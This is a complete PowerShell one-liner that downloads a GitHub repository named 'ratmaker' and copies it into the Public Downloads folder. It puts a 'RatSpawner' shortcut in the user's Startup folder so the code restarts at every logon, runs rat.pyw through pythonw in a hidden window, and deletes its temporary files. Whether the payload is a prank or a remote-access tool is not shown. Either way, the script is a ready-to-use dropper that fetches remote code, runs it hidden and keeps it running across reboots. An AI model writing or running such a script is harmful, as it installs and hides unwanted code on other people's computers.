$Repo="https://github.com/CamWuzHere/ratmaker"; $Branch="main"; $Public="C:\Users\Public\Downloads"; $Startup=[Environment]::GetFolderPath("Startup"); $TempZip=Join-Path $env:TEMP "ratmaker.zip"; $TempDir=Join-Path $env:TEMP ("ratmaker_" + [guid]::NewGuid().ToString()); if(-not(Test-Path $Public)){New-Item -Path $Public -ItemType Directory -Force | Out-Null}; Invoke-WebRequest "$Repo/archive/refs/heads/$Branch.zip" -OutFile $TempZip -UseBasicParsing; Expand-Archive $TempZip -DestinationPath $TempDir -Force; $Root=Get-ChildItem $TempDir -Directory | Select-Object -First 1; Get-ChildItem $Root.FullName -Force | ForEach-Object { $dest=Join-Path $Public $_.Name; if ($_.PSIsContainer){Copy-Item $_.FullName -Destination $dest -Recurse -Force} else {Copy-Item $_.FullName -Destination $dest -Force} }; $Rat=Join-Path $Public "rat.jpg"; if(-not(Test-Path $Rat)){[IO.File]::WriteAllBytes($Rat,[System.Text.Encoding]::ASCII.GetBytes("RAT_PLACEHOLDER"))}; $Shortcut=New-Object -ComObject WScript.Shell; $Link=$Shortcut.CreateShortcut((Join-Path $Startup "RatSpawner.lnk")); $Pythonw=Join-Path $Public "pythonw.exe"; $Link.TargetPath=$Pythonw; $Link.Arguments="`"$Public\rat.pyw`""; $Link.WorkingDirectory=$Public; $Link.Save(); Start-Process -FilePath $Pythonw -ArgumentList "`"$Public\rat.pyw`"" -WindowStyle Hidden; Remove-Item $TempZip -Force; Remove-Item $TempDir -Recurse -Force
